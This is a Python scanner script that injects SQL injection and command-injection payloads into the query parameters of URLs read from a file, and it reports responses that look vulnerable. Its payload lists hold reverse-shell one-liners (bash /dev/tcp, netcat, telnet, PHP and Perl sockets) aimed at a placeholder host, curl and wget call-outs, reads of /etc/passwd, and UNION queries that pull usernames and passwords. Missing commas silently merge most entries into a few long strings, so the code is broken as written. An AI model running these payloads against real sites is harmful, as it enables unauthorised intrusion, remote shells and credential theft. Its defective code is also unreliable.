import requests
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
import sys
import time

# Define sophisticated SQLi and RCE payloads
sqli_payloads = [
    "' OR '1'='1",
    "' OR '1'='1' -- ",
    "' OR SLEEP(5)--",
    "' OR 1=1--",
    "' UNION SELECT null,null,null--",
    "' UNION SELECT version(),user(),database()--",
    "' AND 1=0 UNION ALL SELECT null--",
    "' AND 1=0 UNION ALL SELECT null, null--"
    "' OR '1'='1"
"' OR '1'='1' -- "
"' OR '1'='1' ({"
"' OR 1=1--"
"' OR SLEEP(5)--"
"' OR BENCHMARK(10000000,MD5(1))--"
"' AND 1=0 UNION ALL SELECT NULL--"
"' AND 1=0 UNION ALL SELECT NULL,NULL--"
"' AND 1=0 UNION ALL SELECT NULL,NULL,NULL--"
"admin'--"
"admin' #"
"admin'/*"
"admin')--"
"admin')#"
"admin' or '1'='1'--"
"admin' or '1'='1'#"
"admin' or '1'='1'/*"
"admin') or ('1'='1'--"
"admin') or ('1'='1'#"
"admin') or ('1'='1'/*"
"') or ('1'='1'--"
"') or ('1'='1'#"
"') or ('1'='1'/*"
"')) or (('1'='1'--"
"')) or (('1'='1'#"
"')) or (('1'='1'/*"
"OR 1=1"
"OR 1=1--"
"OR 1=1#"
"OR 1=1/*"
"') OR '1'='1'--"
"') OR '1'='1'#"
"') OR '1'='1'/*"
"' OR 'x'='x"
"' OR 'x'='x'--"
"' OR 'x'='x'#"
"' OR 'x'='x'/*"
"') OR ('x'='x'--"
"') OR ('x'='x'#"
"') OR ('x'='x'/*"
"')) OR (('x'='x'--"
"')) OR (('x'='x'#"
"')) OR (('x'='x'/*"
"' OR 1=1--"
"' OR 1=1#"
"' OR 1=1/*"
"' OR 1=1 AND '1'='1"
"' OR 1=1 AND '1'='1'--"
"' OR 1=1 AND '1'='1'#"
"' OR 1=1 AND '1'='1'/*"
"' OR '1'='1' AND '1'='1"
"' OR '1'='1' AND '1'='1'--"
"' OR '1'='1' AND '1'='1'#"
"' OR '1'='1' AND '1'='1'/*"
"' OR 'a'='a"
"' OR 'a'='a'--"
"' OR 'a'='a'#"
"' OR 'a'='a'/*"
"') OR ('a'='a'--"
"') OR ('a'='a'#"
"') OR ('a'='a'/*"
"')) OR (('a'='a'--"
"')) OR (('a'='a'#"
"')) OR (('a'='a'/*"
"' OR 'x'='x"
"' OR 'x'='x'--"
"' OR 'x'='x'#"
"' OR 'x'='x'/*"
"' OR 1=1--"
"' OR 1=1#"
"' OR 1=1/*"
"' OR 1=1 AND '1'='1"
"' OR 1=1 AND '1'='1'--"
"' OR 1=1 AND '1'='1'#"
"' OR 1=1 AND '1'='1'/*"
"' OR '1'='1' AND '1'='1"
"' OR '1'='1' AND '1'='1'--"
"' OR '1'='1' AND '1'='1'#"
"' OR '1'='1' AND '1'='1'/*"
"' OR 'a'='a"
"' OR 'a'='a'--"
"' OR 'a'='a'#"
"' OR 'a'='a'/*"
"') OR ('a'='a'--"
"') OR ('a'='a'#"
"') OR ('a'='a'/*"
"')) OR (('a'='a'--"
"')) OR (('a'='a'#"
"')) OR (('a'='a'/*"
"' AND 1=0 UNION ALL SELECT NULL,NULL,NULL--"
"' AND 1=0 UNION ALL SELECT NULL,NULL,NULL,NULL--"
"' AND 1=0 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL--"
"' AND 1=0 UNION ALL SELECT user,password FROM users--"
"' AND 1=0 UNION ALL SELECT username,password FROM admin--"
"' AND 1=0 UNION ALL SELECT table_name FROM information_schema.tables--"
"' AND 1=0 UNION ALL SELECT column_name FROM information_schema.columns WHERE table_name='users'--"
"' AND 1=0 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL--"

]

rce_payloads = [
    "; ping -c 1 127.0.0.1;",  # Basic RCE
    "|| ping -c 1 127.0.0.1 ||",  # Basic RCE
    "&& ping -c 1 127.0.0.1 &&",  # Basic RCE
    "`ping -c 1 127.0.0.1`",  # Basic RCE
    "$(ping -c 1 127.0.0.1)",  # Basic RCE
    "|| sleep 5 ||",  # Time-based RCE
    "&& sleep 5 &&",  # Time-based RCE
    "; sleep 5;",  # Time-based RCE
    "; curl http://oob.example.com",  # OOB RCE via HTTP request
    "|| curl http://oob.example.com ||",  # OOB RCE via HTTP request
    "&& curl http://oob.example.com &&",  # OOB RCE via HTTP request
    "; nslookup oob.example.com;",  # OOB RCE via DNS lookup
    "|| nslookup oob.example.com ||",  # OOB RCE via DNS lookup
    "&& nslookup oob.example.com &&"  # OOB RCE via DNS lookup
   ";ping -c 1 127.0.0.1;"
"&& ping -c 1 127.0.0.1 &&"
"|| ping -c 1 127.0.0.1 ||"
"`ping -c 1 127.0.0.1`"
"$(ping -c 1 127.0.0.1)"
"| ping -c 1 127.0.0.1 |"
"; curl http://your-oob-server.com;"
"&& curl http://your-oob-server.com &&"
"|| curl http://your-oob-server.com ||"
"`curl http://your-oob-server.com`"
"$(curl http://your-oob-server.com)"
"| curl http://your-oob-server.com |"
"; wget http://your-oob-server.com;"
"&& wget http://your-oob-server.com &&"
"|| wget http://your-oob-server.com ||"
"`wget http://your-oob-server.com`"
"$(wget http://your-oob-server.com)"
"| wget http://your-oob-server.com |"
"; nslookup your-oob-server.com;"
"&& nslookup your-oob-server.com &&"
"|| nslookup your-oob-server.com ||"
"`nslookup your-oob-server.com`"
"$(nslookup your-oob-server.com)"
"| nslookup your-oob-server.com |"
"; dig your-oob-server.com;"
"&& dig your-oob-server.com &&"
"|| dig your-oob-server.com ||"
"`dig your-oob-server.com`"
"$(dig your-oob-server.com)"
"| dig your-oob-server.com |"
"; whoami;"
"&& whoami &&"
"|| whoami ||"
"`whoami`"
"$(whoami)"
"| whoami |"
"; id;"
"&& id &&"
"|| id ||"
"`id`"
"$(id)"
"| id |"
"; uname -a;"
"&& uname -a &&"
"|| uname -a ||"
"`uname -a`"
"$(uname -a)"
"| uname -a |"
"; sleep 5;"
"&& sleep 5 &&"
"|| sleep 5 ||"
"`sleep 5`"
"$(sleep 5)"
"| sleep 5 |"
"; /bin/bash -i >& /dev/tcp/your-oob-server.com/8080 0>&1;"
"&& /bin/bash -i >& /dev/tcp/your-oob-server.com/8080 0>&1 &&"
"|| /bin/bash -i >& /dev/tcp/your-oob-server.com/8080 0>&1 ||"
"`/bin/bash -i >& /dev/tcp/your-oob-server.com/8080 0>&1`"
"$(/bin/bash -i >& /dev/tcp/your-oob-server.com/8080 0>&1)"
"| /bin/bash -i >& /dev/tcp/your-oob-server.com/8080 0>&1 |"
"; nc -e /bin/sh your-oob-server.com 8080;"
"&& nc -e /bin/sh your-oob-server.com 8080 &&"
"|| nc -e /bin/sh your-oob-server.com 8080 ||"
"`nc -e /bin/sh your-oob-server.com 8080`"
"$(nc -e /bin/sh your-oob-server.com 8080)"
"| nc -e /bin/sh your-oob-server.com 8080 |"
"; bash -i >& /dev/tcp/your-oob-server.com/8080 0>&1;"
"&& bash -i >& /dev/tcp/your-oob-server.com/8080 0>&1 &&"
"|| bash -i >& /dev/tcp/your-oob-server.com/8080 0>&1 ||"
"`bash -i >& /dev/tcp/your-oob-server.com/8080 0>&1`"
"$(bash -i >& /dev/tcp/your-oob-server.com/8080 0>&1)"
"| bash -i >& /dev/tcp/your-oob-server.com/8080 0>&1 |"
"; telnet your-oob-server.com 8080 | /bin/bash | telnet your-oob-server.com 8080;"
"&& telnet your-oob-server.com 8080 | /bin/bash | telnet your-oob-server.com 8080 &&"
"|| telnet your-oob-server.com 8080 | /bin/bash | telnet your-oob-server.com 8080 ||"
"`telnet your-oob-server.com 8080 | /bin/bash | telnet your-oob-server.com 8080`"
"$(telnet your-oob-server.com 8080 | /bin/bash | telnet your-oob-server.com 8080)"
"| telnet your-oob-server.com 8080 | /bin/bash | telnet your-oob-server.com 8080 |"
"; echo 'rce_test' > /tmp/rce_test.txt;"
"&& echo 'rce_test' > /tmp/rce_test.txt &&"
"|| echo 'rce_test' > /tmp/rce_test.txt ||"
"`echo 'rce_test' > /tmp/rce_test.txt`"
"$(echo 'rce_test' > /tmp/rce_test.txt)"
"| echo 'rce_test' > /tmp/rce_test.txt |"
"; cat /etc/passwd;"
"&& cat /etc/passwd &&"
"|| cat /etc/passwd ||"
"`cat /etc/passwd`"
"$(cat /etc/passwd)"
"| cat /etc/passwd |"
"; ls -la;"
"&& ls -la &&"
"|| ls -la ||"
"`ls -la`"
"$(ls -la)"
"| ls -la |"
"; rm -f /tmp/rce_test.txt;"
"&& rm -f /tmp/rce_test.txt &&"
"|| rm -f /tmp/rce_test.txt ||"
"`rm -f /tmp/rce_test.txt`"
"$(rm -f /tmp/rce_test.txt)"
"| rm -f /tmp/rce_test.txt |"
"; nc -nv your-oob-server.com 8080 -e /bin/bash;"
"&& nc -nv your-oob-server.com 8080 -e /bin/bash &&"
"|| nc -nv your-oob-server.com 8080 -e /bin/bash ||"
"`nc -nv your-oob-server.com 8080 -e /bin/bash`"
"$(nc -nv your-oob-server.com 8080 -e /bin/bash)"
"| nc -nv your-oob-server.com 8080 -e /bin/bash |"
"; php -r '$sock=fsockopen(\"your-oob-server.com\",8080);exec(\"/bin/sh -i <&3 >&3 2>&3\");';"
"&& php -r '$sock=fsockopen(\"your-oob-server.com\",8080);exec(\"/bin/sh -i <&3 >&3 2>&3\");' &&"
"|| php -r '$sock=fsockopen(\"your-oob-server.com\",8080);exec(\"/bin/sh -i <&3 >&3 2>&3\");' ||"
"`php -r '$sock=fsockopen(\"your-oob-server.com\",8080);exec(\"/bin/sh -i <&3 >&3 2>&3\");'`"
"$(php -r '$sock=fsockopen(\"your-oob-server.com\",8080);exec(\"/bin/sh -i <&3 >&3 2>&3\");')"
"| php -r '$sock=fsockopen(\"your-oob-server.com\",8080);exec(\"/bin/sh -i <&3 >&3 2>&3\");' |"
"; perl -e 'use Socket;$i=\"your-oob-server.com\";$p=8080;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};';"
"&& perl -e 'use Socket;$i=\"your-oob-server.com\";$p=8080;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};' &&"
"|| perl -e 'use Socket;$i=\"your-oob-server.com\";$p=8080;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};' ||"
"`perl -e 'use Socket;$i=\"your-oob-server.com\";$p=8080;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'`"
"$(perl -e 'use Socket;$i=\"your-oob-server.com\";$p=8080;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};')"
"| perl -e 'use Socket;$i=\"your-oob-server.com\";$p=8080;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};' |"

]

# Function to read URLs from file
def read_urls(file_path):
    with open(file_path, 'r') as file:
        return [line.strip() for line in file.readlines()]

# Function to update URL with payload
def update_url_with_payload(url, param, payload):
    parsed_url = urlparse(url)
    query_params = parse_qs(parsed_url.query)
    query_params[param] = payload
    new_query_string = urlencode(query_params, doseq=True)
    updated_url = urlunparse(parsed_url._replace(query=new_query_string))
    return updated_url

# Function to test for vulnerabilities
def test_for_vulnerabilities(urls, payloads, payload_type):
    for url in urls:
        for param in parse_qs(urlparse(url).query):
            for payload in payloads:
                updated_url = update_url_with_payload(url, param, payload)
                try:
                    # Measure response time for detection of time-based attacks
                    start_time = time.time()
                    response = requests.get(updated_url, timeout=10)
                    end_time = time.time()
                    response_time = end_time - start_time

                    # Clean response for comparison
                    clean_response = requests.get(url, timeout=10)

                    if payload_type == "SQL Injection":
                        # Check for SQLi in the response
                        if response.status_code == 200 and (
                            payload in response.text and response.text != clean_response.text):
                            print(f"[+] {payload_type} detected!")
                            print(f"URL: {updated_url}")
                            print(f"Payload: {payload}\n")
                        elif response_time > 4 and response.status_code == 200:
                            print(f"[+] {payload_type} (time-based) detected!")
                            print(f"URL: {updated_url}")
                            print(f"Payload: {payload}\n")
                        elif "You have an error in your SQL syntax" in response.text:
                            print(f"[+] {payload_type} detected (syntax error)!")
                            print(f"URL: {updated_url}")
                            print(f"Payload: {payload}\n")
                    elif payload_type == "Remote Code Execution":
                        # Check for RCE in the response
                        if response.status_code == 200 and (
                            payload in response.text and response.text != clean_response.text):
                            print(f"[+] {payload_type} detected!")
                            print(f"URL: {updated_url}")
                            print(f"Payload: {payload}\n")
                        elif response_time > 4 and response.status_code == 200:
                            print(f"[+] {payload_type} (time-based) detected!")
                            print(f"URL: {updated_url}")
                            print(f"Payload: {payload}\n")
                        # OOB detection should be verified manually by checking the external server logs
                except requests.RequestException as e:
                    print(f"[-] Request failed for {updated_url}: {e}")
                time.sleep(1)  # Wait for 1 second before the next attempt

# Function to print the banner
def print_banner():
    banner = """
\033[91m
     ____  ____  _____  ____  _____  _  _ 
    (  _ \\(  _ \\(  _  )(  _ \\(  _  )( \\/ )
     )(_) )) _ < )(_)(  ) _ < )(_)(  \\  / 
    (____/(____/(_____)(____/(_____)(__)  
\033[0m
    """
    print(banner)

# Main function
def main(file_path):
    print_banner()
    urls = read_urls(file_path)
    print("[*] Testing for SQL Injection...")
    test_for_vulnerabilities(urls, sqli_payloads, "SQL Injection")
    print("[*] Testing for Remote Code Execution...")
    test_for_vulnerabilities(urls, rce_payloads, "Remote Code Execution")

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} <file_with_urls>")
        sys.exit(1)

    file_path = sys.argv[1]
    main(file_path)
